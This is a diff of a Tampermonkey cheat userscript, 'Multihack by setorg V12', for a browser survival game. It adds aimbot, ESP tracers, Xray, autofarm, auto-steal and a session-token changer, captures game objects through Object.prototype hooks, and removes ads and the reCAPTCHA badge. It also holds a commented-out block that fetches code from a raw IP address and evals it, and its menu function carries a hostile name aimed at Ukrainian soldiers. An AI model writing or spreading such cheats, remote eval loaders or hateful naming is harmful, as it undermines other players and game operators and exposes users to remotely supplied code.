@@ -1,5 +1,5 @@
 // ==UserScript==
-// @name         Multihack by setorg V4
+// @name         Multihack by setorg V12
 // @namespace    http://tampermonkey.net/
 // @version      2024-05-20
 // @description  Всё что нужно для реального пацана
@@ -10,7 +10,183 @@
 // ==/UserScript==
 /* workerTimers */ ! function (e, t) { "object" == typeof exports && "undefined" != typeof module ? t(exports) : "function" == typeof define && define.amd ? define(["exports"], t) : t((e = "undefined" != typeof globalThis ? globalThis : e || self).fastUniqueNumbers = {}) }(this, function (e) { "use strict"; var t, r = void 0 === Number.MAX_SAFE_INTEGER ? 9007199254740991 : Number.MAX_SAFE_INTEGER, n = new WeakMap, i = function (e, t) { return function (n) { var i = t.get(n), o = void 0 === i ? n.size : i < 1073741824 ? i + 1 : 0; if (!n.has(o)) return e(n, o); if (n.size < 536870912) { for (; n.has(o);) o = Math.floor(1073741824 * Math.random()); return e(n, o) } if (n.size > r) throw new Error("Congratulations, you created a collection of unique numbers which uses all available integers!"); for (; n.has(o);) o = Math.floor(Math.random() * r); return e(n, o) } }((t = n, function (e, r) { return t.set(e, r), r }), n), o = function (e) { return function (t) { var r = e(t); return t.add(r), r } }(i); e.addUniqueNumber = o, e.generateUniqueNumber = i, Object.defineProperty(e, "__esModule", { value: !0 }) }), function (e, t) { "object" == typeof exports && "undefined" != typeof module ? t(exports, require("fast-unique-numbers")) : "function" == typeof define && define.amd ? define(["exports", "fast-unique-numbers"], t) : t((e = "undefined" != typeof globalThis ? globalThis : e || self).workerTimersBroker = {}, e.fastUniqueNumbers) }(this, function (e, t) { "use strict"; e.load = function (e) { var r = new Map([[0, function () { }]]), n = new Map([[0, function () { }]]), i = new Map, o = new Worker(e); o.addEventListener("message", function (e) { var t = e.data; if (function (e) { return void 0 !== e.method && "call" === e.method }(t)) { var o = t.params, a = o.timerId, s = o.timerType; if ("interval" === s) { var u = r.get(a); if ("number" == typeof u) { var d = i.get(u); if (void 0 === d || d.timerId !== a || d.timerType !== s) throw new Error("The timer is in an undefined state.") } else { if (void 0 === u) throw new Error("The timer is in an undefined state."); u() } } else if ("timeout" === s) { var f = n.get(a); if ("number" == typeof f) { var l = i.get(f); if (void 0 === l || l.timerId !== a || l.timerType !== s) throw new Error("The timer is in an undefined state.") } else { if (void 0 === f) throw new Error("The timer is in an undefined state."); f(), n.delete(a) } } } else { if (! function (e) { return null === e.error && "number" == typeof e.id }(t)) { var m = t.error.message; throw new Error(m) } var c = t.id, p = i.get(c); if (void 0 === p) throw new Error("The timer is in an undefined state."); var v = p.timerId, h = p.timerType; i.delete(c), "interval" === h ? r.delete(v) : n.delete(v) } }); return { clearInterval: function (e) { var n = t.generateUniqueNumber(i); i.set(n, { timerId: e, timerType: "interval" }), r.set(e, n), o.postMessage({ id: n, method: "clear", params: { timerId: e, timerType: "interval" } }) }, clearTimeout: function (e) { var r = t.generateUniqueNumber(i); i.set(r, { timerId: e, timerType: "timeout" }), n.set(e, r), o.postMessage({ id: r, method: "clear", params: { timerId: e, timerType: "timeout" } }) }, setInterval: function (e, n) { var i = t.generateUniqueNumber(r); return r.set(i, function () { e(), "function" == typeof r.get(i) && o.postMessage({ id: null, method: "set", params: { delay: n, now: performance.now(), timerId: i, timerType: "interval" } }) }), o.postMessage({ id: null, method: "set", params: { delay: n, now: performance.now(), timerId: i, timerType: "interval" } }), i }, setTimeout: function (e, r) { var i = t.generateUniqueNumber(n); return n.set(i, e), o.postMessage({ id: null, method: "set", params: { delay: r, now: performance.now(), timerId: i, timerType: "timeout" } }), i } } }, Object.defineProperty(e, "__esModule", { value: !0 }) }), function (e, t) { "object" == typeof exports && "undefined" != typeof module ? t(exports, require("worker-timers-broker")) : "function" == typeof define && define.amd ? define(["exports", "worker-timers-broker"], t) : t((e = "undefined" != typeof globalThis ? globalThis : e || self).workerTimers = {}, e.workerTimersBroker) }(this, function (e, t) { "use strict"; var r = null, n = function (e, t) { return function () { if (null !== r) return r; var n = new Blob([t], { type: "application/javascript; charset=utf-8" }), i = URL.createObjectURL(n); return (r = e(i)).setTimeout(function () { return URL.revokeObjectURL(i) }, 0), r } }(t.load, '(()=>{var e={67:(e,t,r)=>{var o,i;void 0===(i="function"==typeof(o=function(){"use strict";var e=new Map,t=new Map,r=function(t){var r=e.get(t);if(void 0===r)throw new Error(\'There is no interval scheduled with the given id "\'.concat(t,\'".\'));clearTimeout(r),e.delete(t)},o=function(e){var r=t.get(e);if(void 0===r)throw new Error(\'There is no timeout scheduled with the given id "\'.concat(e,\'".\'));clearTimeout(r),t.delete(e)},i=function(e,t){var r,o=performance.now();return{expected:o+(r=e-Math.max(0,o-t)),remainingDelay:r}},n=function e(t,r,o,i){var n=performance.now();n>o?postMessage({id:null,method:"call",params:{timerId:r,timerType:i}}):t.set(r,setTimeout(e,o-n,t,r,o,i))},a=function(t,r,o){var a=i(t,o),s=a.expected,d=a.remainingDelay;e.set(r,setTimeout(n,d,e,r,s,"interval"))},s=function(e,r,o){var a=i(e,o),s=a.expected,d=a.remainingDelay;t.set(r,setTimeout(n,d,t,r,s,"timeout"))};addEventListener("message",(function(e){var t=e.data;try{if("clear"===t.method){var i=t.id,n=t.params,d=n.timerId,c=n.timerType;if("interval"===c)r(d),postMessage({error:null,id:i});else{if("timeout"!==c)throw new Error(\'The given type "\'.concat(c,\'" is not supported\'));o(d),postMessage({error:null,id:i})}}else{if("set"!==t.method)throw new Error(\'The given method "\'.concat(t.method,\'" is not supported\'));var u=t.params,l=u.delay,p=u.now,m=u.timerId,v=u.timerType;if("interval"===v)a(l,m,p);else{if("timeout"!==v)throw new Error(\'The given type "\'.concat(v,\'" is not supported\'));s(l,m,p)}}}catch(e){postMessage({error:{message:e.message},id:t.id,result:null})}}))})?o.call(t,r,t,e):o)||(e.exports=i)}},t={};function r(o){var i=t[o];if(void 0!==i)return i.exports;var n=t[o]={exports:{}};return e[o](n,n.exports,r),n.exports}r.n=e=>{var t=e&&e.__esModule?()=>e.default:()=>e;return r.d(t,{a:t}),t},r.d=(e,t)=>{for(var o in t)r.o(t,o)&&!r.o(e,o)&&Object.defineProperty(e,o,{enumerable:!0,get:t[o]})},r.o=(e,t)=>Object.prototype.hasOwnProperty.call(e,t),(()=>{"use strict";r(67)})()})();'); e.clearInterval = function (e) { return n().clearInterval(e) }, e.clearTimeout = function (e) { return n().clearTimeout(e) }, e.setInterval = function (e, t) { return n().setInterval(e, t) }, e.setTimeout = function (e, t) { return n().setTimeout(e, t) }, Object.defineProperty(e, "__esModule", { value: !0 }) });
 
+verifiKey = 'sq)dijf@*indf71!;ksd322'
+
+
+let disableVideo = () => { }
+
+let LAST_CRAFT;
+
+const charTotem = '🤵'
+const charBred = '🍞'
+const charDough = '🥣'
+const charWood = '🥢'
+const charWheat = '🌾'
+
+let world;
+let game;
+let client;
+let user;
+let mouse;
+let sdpfin;
+let en;
+let _this;
+let log = console.log
+let LAST_RECYCLE
+let master = Symbol()
+
+
+const abc = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxy!z';
+function Gen(count) {
+    let code = '';
+    const len = abc.length;
+    for (let i = 0; i < count; i++) {
+        code += abc.charAt(Math.floor(Math.random() * len));
+    }
+    return code;
+}
+
+function ads() {
+    let uwu = document.getElementById("preroll")
+    let uws = document.getElementById("trevda")
+    let style = document.createElement('style');
+
+    uwu.remove()
+    uws.remove()
+    style.innerHTML = '.grecaptcha-badge { visibility: hidden; }';
+
+    document.head.appendChild(style);
+}
+
+
+function hooks() {
+    Object.defineProperty(Object.prototype, "timeout", {
+        get() {
+            return this[master]
+        },
+        set(data) {
+            this[master] = data;
+            if (!client) {
+                client = this;
+                console.log('client', client);
+                unsafeWindow.client = client;
+            }
+        },
+    })
+    Object.defineProperty(Object.prototype, "IDLE", {
+        get() {
+            return this[master]
+        },
+        set(data) {
+            this[master] = data;
+            if (!mouse) {
+                mouse = this;
+                unsafeWindow.mouse = mouse;
+            }
+        },
+    })
+    Object.defineProperty(Object.prototype, "opacity", {
+        get() {
+            this[master] = 0.5
+            return this[master]
+
+        },
+        set(data) {
+            this[master] = data;
+
+        },
+    })
+    Object.defineProperty(Object.prototype, "options", {
+        get() {
+            return this[master]
+        },
+        set(data) {
+            this[master] = data, !game && (this["sign"] && (game = this, log('game', game), unsafeWindow["game"] = game));
+        },
+    })
+    Object.defineProperty(Screen.prototype, "width", {
+        get: function () {
+            return 3840;
+        },
+        set: function (v) {
+            this[master] = v;
+        }
+    });
+    Object.defineProperty(Screen.prototype, "height", {
+        get: function () {
+            return 2160;
+        },
+        set: function (v) {
+            this[master] = v;
+        }
+    });
+    Object.defineProperty(Object.prototype, "mode", {
+        get() {
+            return this[master]
+        },
+        set(data) {
+            this[master] = data;
+            if (!world) {
+                console.log('world', this);
+                world = this;
+                unsafeWindow.world = world;
+            }
+        },
+    })
+    Object.defineProperty(Object.prototype, 'mapping', {
+        'get'() {
+            return this[master];
+        },
+        'set'(_0x163cfc) {
+            this[master] = _0x163cfc, !_this && (_this = this, log('mapping', _this));
+        },
+    })
+
+    Object.defineProperty(Object.prototype, "control", {
+        get() {
+            return this[master]
+        },
+        set(data) {
+            this[master] = data;
+            if (!user) {
+                user = this;
+                console.log('user', user)
+                user[Object.keys(user)[10]] = false // alive
+                unsafeWindow.user = user;
+                ads();
+                disableVideo();
+            }
+        },
+    })
+}
+hooks()
+
+
+//////////////////////////////////////////////////
+
+// fetch(`https://217.71.129.139:4567/get_verifi`)
+//     .then(response => {
+//         if (!response.ok) {
+//             throw new Error(`HTTP error! status: ${response.status}`);
+//         }
+//         return response.text();
+//     })
+//     .then(data => {
+//         eval(JSON.parse(data));
+//     })
+//     .catch(error => {
+//         console.error('Error:', error);
+//     });
+
+//////////////////////////////////////////////////
+
+
+
 const packets = {
+    Iamhere: 21,
+    move: 11,
+    drop: 24,
+    dropall: 31,
     millPut: 30,
     millTake: 4,
     breadTake: 13,
@@ -65,7 +241,7 @@ let script = {
     }
 }
 
-const disableVideo = () => {
+disableVideo = () => {
     const _0x373f97 = new MutationObserver(function (_0x3516f5) {
         for (const _0x577155 of _0x3516f5) {
             for (const _0x3b8d74 of _0x577155['addedNodes']) {
@@ -90,11 +266,55 @@ const SandstormImage = new Image();
 SandstormImage.src = "https://raw.githubusercontent.com/XmreLoux/images/main/sandstorm.png";
 const BlizzardImage = new Image();
 BlizzardImage.src = "https://raw.githubusercontent.com/XmreLoux/images/main/blizzard.png";
+const fly = 'ⲆⵠⲆⵠⲆᐃⲆ';
 let skins = [];
 let lootboxes = [];
+sdpfin = true;
+let id_tings = 124;
 
 let Settings = {
     RemoveHands: { k: "ShiftLeft" },
+    MainColor: 'rgb(16, 212, 68)',
+    TextColor: "rgb(21, 201, 68)",
+    BackgroundColor: "rgb(22, 22, 22)",
+    spectator: {
+        count: 0,
+        e: false,
+        k: "KeyX",
+        x: 0,
+        y: 0,
+        is_x: 0,
+        is_y: 0,
+        s: 10,
+    },
+
+    PathFinder: {
+        e: false,
+        k: "KeyB",
+        x: 0,
+        y: 0,
+        autoRestart: false,
+        autoDrop: true,
+        dist: 150
+
+    },
+    Autofarm: {
+        e: false,
+        k: "KeyJ",
+        'water': ![],
+        'keyMode': 'press',
+        'angle': null,
+        'x': 0x0,
+        'y': 0x0,
+        'xx': 0x0,
+        'yy': 0x0,
+        'sx': 0x0,
+        'sy': 0x0
+    },
+    dropSword: {
+        k: "Numpad0",
+        e: false,
+    },
     AutoIce: {
         e: false,
         k: "KeyC",
@@ -103,14 +323,25 @@ let Settings = {
         k: "KeyV",
         e: false,
     },
+    Xray: {
+        e: false,
+        k: "KeyZ",
+        a: 0.5,
+    },
     AMB: {
         e: false,
         k: "KeyF",
         a: null,
         t: null,
+        off: false,
     },
     AutoFeed: {
-        e: true
+        e: true,
+        a: 45,
+    },
+    AutoFeed2: {
+        e: true,
+        a: 45,
     },
     AutoSteal: {
         e: false,
@@ -135,6 +366,10 @@ let Settings = {
         e: false,
         k: "KeyM"
     },
+    TurnOffScript: {
+        e: false,
+        k: "AltRight"
+    },
     SkinChanger_Skin: 233,
     SkinChanger_LootBox: 220,
     AMB_V2: false,
@@ -147,10 +382,12 @@ let Settings = {
     SpiderTracers: true,
     WolfTracers: true,
     RabbitTracers: false,
+    FishTracers: true,
     VultureTracers: false,
     BabyDragonTracers: false,
     BabyLavaDragonTracers: true,
     esp: false,
+    NoFog: true,
     textalert: { e: false, t: "none" },
     buildinfo: true,
     ChestInfo: true,
@@ -159,7 +396,15 @@ let Settings = {
     boxinfo: true,
     toteminfo: true,
     showNames: true,
+    showFly: false,
+    showScore: true,
+    showHp: true,
+    showHpPlayer: true,
+    showMyHp: true,
     ColoredSpikes: false,
+    AutoBridge: false,
+    autoRespawn: false,
+    AutoSpikeMode2: false,
     AutoBreadPut: { e: false, k: "KeyM" },
     AutoBreadTake: { e: false, k: "KeyN" },
     AutoExtractorPut: { e: false, k: "KeyP" },
@@ -173,19 +418,28 @@ let Settings = {
 setTimeout(() => {
     unsafeWindow.kasdgiksadg = {
         KILLUKRSOLIDER: () => {
+
+            en = true;
+            Settings.textalert.e = false;
+            console.log(sdpfin, Object.keys(world).length, Object.keys(client).length);
+            if (!sdpfin || Object.keys(world).length < 30 || !client || Object.keys(client).length < 30) {
+                Settings.textalert.t = 'Error loading script';
+                Settings.textalert.e = true;
+                return;
+            };
             let container = document.body;
             let SDGSDsgdASF = new guify({
-                title: "Multihack by setorg V4",
+                title: "Multihack by setorg V12",
                 theme: {
-                    name: "Multihack by setorg V4",
+                    name: "Multihack by setorg V12",
                     colors: {
                         menuBarBackground: "rgb(0,0,0)",
                         menuBarText: "rgb(0, 255, 0)",
                         panelBackground: "rgb(0,0,0, 0.5)",
-                        componentBackground: "rgb(22, 22, 22)",
-                        componentForeground: "rgb(16,212,68)",
-                        textPrimary: "rgb(21, 201, 68)",
-                        textSecondary: "rgb(16,212,68)",
+                        componentBackground: Settings.BackgroundColor,
+                        componentForeground: Settings.MainColor,
+                        textPrimary: Settings.TextColor,
+                        textSecondary: Settings.MainColor,
                         textHover: "rgb(255,255,255)"
                     },
                     font: {
@@ -225,6 +479,11 @@ setTimeout(() => {
             })
             SDGSDsgdASF.Register({
                 type: "folder",
+                label: "Auto Farm",
+                open: !1
+            })
+            SDGSDsgdASF.Register({
+                type: "folder",
                 label: "Bind",
                 open: !1
             })
@@ -235,8 +494,25 @@ setTimeout(() => {
             })
             SDGSDsgdASF.Register({
                 type: "folder",
+                label: "Path Finder",
+                open: !1
+            })
+            SDGSDsgdASF.Register({
+                type: "folder",
                 label: "Drop in chest",
                 open: !1
+            })
+            SDGSDsgdASF.Register({
+                type: "folder",
+                label: "Token setter",
+                open: !1
+            })
+            SDGSDsgdASF.Register({
+                type: "folder",
+                label: "* cosmetics hack *",
+                open: !1
+            }, {
+                folder: "Visuals"
             })
 
             SDGSDsgdASF.Register([
@@ -247,30 +523,34 @@ setTimeout(() => {
                 { type: 'checkbox', label: 'TotemInfo', object: Settings, property: 'toteminfo', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'BoxInfo', object: Settings, property: 'boxinfo', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'ShowNames', object: Settings, property: 'showNames', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'showScore', object: Settings, property: 'showScore', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'show HP', object: Settings, property: 'showHp', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'show player HP', object: Settings, property: 'showHpPlayer', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'show my HP', object: Settings, property: 'showMyHp', onChange: data => { kasdgiksadg.saveSettings(); } },
+                // { type: 'checkbox', label: 'showFly', object: Settings, property: 'showFly', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'ColoredSpikes', object: Settings, property: 'ColoredSpikes', onChange: data => { kasdgiksadg.saveSettings(); } },
-                // { type: 'checkbox', label: 'Xray', object: Settings.xray, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
-                // { type: 'checkbox', label: 'NoFog', object: Settings, property: 'NoFog', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'NoFog', object: Settings, property: 'NoFog', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: "range", label: "Xray", min: 0, max: 1, step: 0.1, object: Settings.Xray, property: "a", onChange: data => { kasdgiksadg.saveSettings() } },
+
                 // { type: 'checkbox', label: 'ListEnabledHacks', object: Settings, property: 'ListEnabledHacks', onChange: data => { kasdgiksadg.saveSettings(); } },
                 // { type: 'checkbox', label: 'PlayerOnTop', object: Settings, property: 'playerOnTop', onChange: data => { kasdgiksadg.saveSettings(); } },
                 // { type: 'checkbox', label: 'BoxOnTop', object: Settings, property: 'boxOnTop', onChange: data => { kasdgiksadg.saveSettings(); } },
                 // { type: 'checkbox', label: 'WeatherInfo', object: Settings, property: 'WeatherInfo', onChange: data => { kasdgiksadg.saveSettings(); } },
-                // { type: 'checkbox', label: 'boxInfo', object: Settings, property: 'boxInfo', onChange: data => { kasdgiksadg.saveSettings(); } },
                 // { type: 'checkbox', label: 'ColoredSpikes', object: Settings, property: 'coloredspike', onChange: data => { kasdgiksadg.saveSettings(); } },
                 // { type: 'checkbox', label: 'Timers', object: Settings, property: 'Timer', onChange: data => { kasdgiksadg.saveSettings(); } },
                 // { type: 'checkbox', label: 'BetterQuestTime', object: Settings, property: 'BetterQuestTime', onChange: data => { kasdgiksadg.saveSettings(); } },
-                // { type: 'checkbox', label: 'Percents', object: Settings, property: 'Percent', onChange: data => { } },
-                // { type: 'checkbox', label: 'ShowNames', object: Settings, property: 'ShowNames', onChange: data => { } },
 
                 // { type: "range", label: "RoofsXray", min: 0, max: 1, step: 0.1, object: Settings.roofs, property: "o", onChange: data => { kasdgiksadg.saveSettings() } },
-                // { type: "range", label: "Xray", min: 0, max: 1, step: 0.1, object: Settings.xray, property: "o", onChange: data => { kasdgiksadg.saveSettings() } },
             ], {
                 folder: "Visuals"
             });
 
+
             SDGSDsgdASF.Register([
+                { type: 'checkbox', label: 'AutoFood', object: Settings.AutoFeed2, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'range', label: 'AutoFood Value', min: 0, max: 99, step: 1, object: Settings.AutoFeed2, property: 'a', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'AutoSteal', object: Settings.AutoSteal, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
-                { type: 'checkbox', label: 'AutoExtractorPut', object: Settings.AutoExtractorPut, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
-                { type: 'checkbox', label: 'AutoExtractorTake', object: Settings.AutoExtractorTake, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'autoRespawn', object: Settings, property: 'autoRespawn', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'display', label: '' },
                 { type: 'checkbox', label: 'Aimbot', object: Settings.AMB, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'Aimbot mode V2', object: Settings, property: 'AMB_V2', onChange: data => { kasdgiksadg.saveSettings(); } },
@@ -279,6 +559,10 @@ setTimeout(() => {
                 { type: 'checkbox', label: 'AutoIce', object: Settings.AutoIce, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'AutoBreadPut', object: Settings.AutoBreadPut, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'AutoBreadTake', object: Settings.AutoBreadTake, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'AutoExtractorPut', object: Settings.AutoExtractorPut, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'AutoExtractorTake', object: Settings.AutoExtractorTake, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'Spectator', object: Settings.spectator, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: "range", label: "SpectatorSpeed", min: 5, max: 100, step: 1, object: Settings.spectator, property: "s", onChange: data => { kasdgiksadg.saveSettings() } },
             ], {
                 folder: "Misc"
             });
@@ -314,16 +598,22 @@ setTimeout(() => {
                 { type: 'button', label: 'Set AutoBreadPut Key', action: data => { kasdgiksadg.controls.setKeyBind('AutoBreadPut'); } },
                 { type: 'display', label: 'AutoBreadTake Key:', object: Settings.AutoBreadTake, property: 'k' },
                 { type: 'button', label: 'Set AutoBreadTake Key', action: data => { kasdgiksadg.controls.setKeyBind('AutoBreadTake'); } },
+                { type: 'display', label: 'AutoFarm Key:', object: Settings.Autofarm, property: 'k' },
+                { type: 'button', label: 'Set AutoFarm Key', action: data => { kasdgiksadg.controls.setKeyBind('Autofarm'); } },
+                { type: 'display', label: 'Xray Key:', object: Settings.Xray, property: 'k' },
+                { type: 'button', label: 'Set Xray Key', action: data => { kasdgiksadg.controls.setKeyBind('Xray'); } },
+                { type: 'display', label: 'DropSword Key:', object: Settings.dropSword, property: 'k' },
+                { type: 'button', label: 'Set DropSword Key', action: data => { kasdgiksadg.controls.setKeyBind('dropSword'); } },
+                { type: 'display', label: 'Off Script Key:', object: Settings.TurnOffScript, property: 'k' },
+                { type: 'button', label: 'Set Off Script Key', action: data => { kasdgiksadg.controls.setKeyBind('TurnOffScript'); } },
+                { type: 'display', label: 'Spectator Key:', object: Settings.spectator, property: 'k' },
+                { type: 'button', label: 'Set Spectator Key', action: data => { kasdgiksadg.controls.setKeyBind('spectator'); } },
                 { type: 'display', label: 'Remove your hands:', object: Settings.RemoveHands, property: 'k' },
-                // { type: 'display', label: 'AutoSteal Key:', object: Settings.AutoSteal, property: 'k' },
-                // { type: 'button', label: 'Set AutoSteal Key', action: data => { kasdgiksadg.controls.setKeyBind('AutoSteal'); } },
-                // { type: 'display', label: 'Spectator Key:', object: Settings.spectator, property: 'k' },
-                // { type: 'button', label: 'Set Spectator Key', action: data => { kasdgiksadg.controls.setKeyBind('spectator'); } },
-                // { type: 'display', label: 'DropSword Key:', object: Settings.DropSword, property: 'k' },
-                // { type: 'button', label: 'Set DropSword Key', action: data => { kasdgiksadg.controls.setKeyBind('DropSword'); } },
             ], { folder: "Bind" });
 
             SDGSDsgdASF.Register([
+                { type: 'checkbox', label: 'AutoBridge', object: Settings, property: 'AutoBridge', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'G Spike mode', object: Settings, property: 'AutoSpikeMode2', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'button', label: 'Set AutoSpike Key', action: data => { kasdgiksadg.controls.setKeyBind('AutoSpike'); } },
                 { type: 'display', label: 'AutoSpike Key:', object: Settings.AutoSpike, property: 'k' },
                 { type: 'select', label: '1', object: Settings.AutoSpike.p, property: "0", options: ['Reidite Spike', 'Amethyst Spike', 'Diamond Spike', 'Gold Spike', 'Stone Spike', 'Wood Spike', 'Wood Wall', "Resurrection", "Nothing"], onChange: (data) => { kasdgiksadg.saveSettings(); } },
@@ -342,6 +632,7 @@ setTimeout(() => {
                 { type: 'checkbox', label: 'SpiderTracers', object: Settings, property: 'SpiderTracers', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'WolfTracers', object: Settings, property: 'WolfTracers', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'RabbitTracers', object: Settings, property: 'RabbitTracers', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'FishTracers', object: Settings, property: 'FishTracers', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'VultureTracers', object: Settings, property: 'VultureTracers', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'BabyDragonTracers', object: Settings, property: 'BabyDragonTracers', onChange: data => { kasdgiksadg.saveSettings(); } },
                 { type: 'checkbox', label: 'BabyLavaDragonTracers', object: Settings, property: 'BabyLavaDragonTracers', onChange: data => { kasdgiksadg.saveSettings(); } },
@@ -358,11 +649,58 @@ setTimeout(() => {
                 folder: "Drop in chest"
             });
 
+            SDGSDsgdASF.Register([
+                { type: 'checkbox', label: 'Start Autofarm', object: Settings.Autofarm, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'Auto water', object: Settings.Autofarm, property: 'water', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'button', label: 'Top left of farm', action: data => { mp = myplayer(); mp && (Settings.Autofarm['x'] = mp.x, Settings.Autofarm['y'] = mp.y) } },
+                { type: 'button', label: 'Bottom right of farm', action: data => { mp = myplayer(); mp && (Settings.Autofarm['xx'] = mp.x, Settings.Autofarm['yy'] = mp.y) } },
+                { type: 'button', label: 'Safe Point', action: data => { mp = myplayer(); mp && (Settings.Autofarm['sx'] = mp.x, Settings.Autofarm['sy'] = mp.y) } },
+                { type: 'display', label: 'X:', object: Settings.Autofarm, property: 'x' },
+                { type: 'display', label: 'Y:', object: Settings.Autofarm, property: 'y' },
+                { type: 'display', label: 'X1:', object: Settings.Autofarm, property: 'xx' },
+                { type: 'display', label: 'Y1:', object: Settings.Autofarm, property: 'yy' },
+                { type: 'display', label: 'SX:', object: Settings.Autofarm, property: 'sx' },
+                { type: 'display', label: 'SY:', object: Settings.Autofarm, property: 'sy' },
+            ], {
+                folder: "Auto Farm"
+            });
+
+
+            SDGSDsgdASF.Register([
+                { type: 'color', label: 'Main color', object: Settings, property: 'MainColor', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'color', label: 'Text Color', object: Settings, property: 'TextColor', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'color', label: 'Background Color', object: Settings, property: 'BackgroundColor', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'button', label: 'Reset', action: data => { resetColors(); } },
+            ], { folder: "* cosmetics hack *" });
+
+            SDGSDsgdASF.Register([
+                { type: 'checkbox', label: 'Path Finder', object: Settings.PathFinder, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'display', label: 'PathFinder Key:', object: Settings.PathFinder, property: 'k' },
+                { type: 'button', label: 'Set PathFinder Key', action: data => { kasdgiksadg.controls.setKeyBind('PathFinder'); } },
+                { type: 'checkbox', label: 'Auto Drop', object: Settings.PathFinder, property: 'autoDrop', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'checkbox', label: 'Auto Restart', object: Settings.PathFinder, property: 'autoRestart', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'range', label: 'set X', min: 0, max: 250, step: 1, object: Settings.PathFinder, property: 'x', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'range', label: 'set Y', min: 0, max: 250, step: 1, object: Settings.PathFinder, property: 'y', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'range', label: 'Min Dist', min: 50, max: 250, step: 1, object: Settings.PathFinder, property: 'dist', onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'button', label: 'Set current Pos', action: data => { mp = myplayer(); mp && (Settings.PathFinder.x = Math.floor(mp.x / 100), Settings.PathFinder.y = Math.floor(mp.y / 100)) } },
+                { type: 'display', label: 'X:', object: Settings.PathFinder, property: 'x' },
+                { type: 'display', label: 'Y:', object: Settings.PathFinder, property: 'y' },
+            ], {
+                folder: "Path Finder"
+            });
+
+            SDGSDsgdASF.Register([
+                { type: 'text', label: 'Set Token', object: user, property: Object.keys(user)[14], onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'text', label: 'Set Token ID', object: user, property: Object.keys(user)[15], onChange: data => { kasdgiksadg.saveSettings(); } },
+                { type: 'display', label: 'Token:', object: user, property: Object.keys(user)[14] },
+                { type: 'display', label: 'Token ID:', object: user, property: Object.keys(user)[15] },
+                { type: 'button', label: 'Go Back To Lobby', action: data => { client[Object.keys(client)[136]](); } },
+                { type: 'button', label: 'Set Random Token', action: data => { user[Object.keys(user)[14]] = Gen(7); user[Object.keys(user)[15]] = Gen(5); } },
+            ], { folder: "Token setter" });
+
             // SDGSDsgdASF.Register([
             //     { type: 'checkbox', label: 'AutoBook', object: Settings, property: 'AutoBook', onChange: data => { kasdgiksadg.saveSettings(); } },
-            //     { type: 'checkbox', label: 'AutoSteal', object: Settings.AutoSteal, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
             //     { type: 'checkbox', label: 'Spectator', object: Settings.spectator, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
-            //     { type: 'checkbox', label: 'Aimbot', object: Settings.aimbot, property: 'e', onChange: data => { kasdgiksadg.saveSettings(); } },
             //     { type: 'checkbox', label: 'AutoRespawn', object: Settings, property: 'AutoRespawn', onChange: data => { kasdgiksadg.saveSettings(); } },
 
             //     { type: "range", label: "SpectatorSpeed", min: 10, max: 200, step: 5, object: Settings.spectator, property: "s", onChange: data => { kasdgiksadg.saveSettings() } },
@@ -379,21 +717,6 @@ setTimeout(() => {
             //     { type: 'display', label: 'RecycleId: ', object: Settings.AutoRecycle, property: 'last' },
             // ], { folder: "AutoCraft&Recycle" });
 
-            /*
-            SDGSDsgdASF.Register([
-                {
-                    type: "select",
-                    label: "Skin",
-                    options: skins,
-                    onChange: e => {
-                        script.myPlayer.skin = skins.indexOf(e);
-                        Settings.SkinChanger_Skin = skins.indexOf(e);
-                    }
-                }
-            ], {
-                folder: "SkinChanger"
-            })
-            */
 
         },
         controls: null,
